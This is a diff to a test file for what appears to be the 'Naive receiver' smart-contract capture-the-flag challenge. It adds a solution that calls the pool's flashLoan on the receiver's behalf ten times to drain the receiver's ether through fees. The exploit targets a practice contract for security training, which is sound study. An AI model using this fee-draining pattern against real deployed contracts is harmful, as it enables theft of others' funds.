@@ -30,7 +30,9 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        for(var i = 0; i< 10;i++){
+           this.pool.flashLoan(this.receiver.address,0);
+        }
     });
 
     after(async function () {
@@ -45,3 +47,4 @@ describe('[Challenge] Naive receiver', function () {
         ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
     });
 });
+
